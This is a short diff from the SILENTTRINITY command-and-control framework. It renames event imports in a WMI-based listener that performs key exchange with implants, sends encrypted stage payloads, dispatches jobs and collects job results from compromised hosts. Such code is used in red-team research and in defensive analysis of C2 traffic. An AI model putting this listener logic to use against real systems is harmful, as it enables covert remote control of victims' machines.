@@ -1,6 +1,6 @@
 import logging
 import sys
-import silenttrinity.core.events as events
+from silenttrinity.core.events import Events
 from silenttrinity.core.teamserver.listener import Listener
 from uuid import UUID
 from time import sleep
@@ -163,24 +163,24 @@ class STListener(Listener):
                     if creator == "client":
 
                         if op == "kex":
-                            pub_key = self.dispatch_event(events.KEX, (GUID, self["Host"], b64decode(data)))
+                            pub_key = self.dispatch_event(Events.KEX, (GUID, self["Host"], b64decode(data)))
                             self.write(iWbemServices, records, payload=f"{GUID}:kex:server:{b64encode(pub_key.encode()).decode()}")
 
                         elif op == "stage":
-                            stage_file = self.dispatch_event(events.ENCRYPT_STAGE, (self["Comms"], GUID, self["Host"]))
+                            stage_file = self.dispatch_event(Events.ENCRYPT_STAGE, (self["Comms"], GUID, self["Host"]))
                             if stage_file:
-                                self.dispatch_event(events.SESSION_STAGED, f'Sending stage ({sys.getsizeof(stage_file)} bytes) ->  {self["Host"]} ...')
+                                self.dispatch_event(Events.SESSION_STAGED, f'Sending stage ({sys.getsizeof(stage_file)} bytes) ->  {self["Host"]} ...')
                                 self.write(iWbemServices, records, payload=f"{GUID}:stage:server:{b64encode(stage_file)}")
 
                         elif op == "jobs":
-                            job = self.dispatch_event(events.SESSION_CHECKIN, (GUID, self["Host"]))
+                            job = self.dispatch_event(Events.SESSION_CHECKIN, (GUID, self["Host"]))
                             if job:
                                 self.write(iWbemServices, records, payload=f"{GUID}:jobs:server:{b64encode(job).decode()}")
 
                         elif op.startswith("job_results"):
                             _,job_id = op.split("|")
                             print(data)
-                            self.dispatch_event(events.JOB_RESULT, (GUID, job_id, b64decode(data)))
+                            self.dispatch_event(Events.JOB_RESULT, (GUID, job_id, b64decode(data)))
                             self.write(iWbemServices, records)
 
             except Exception as e:
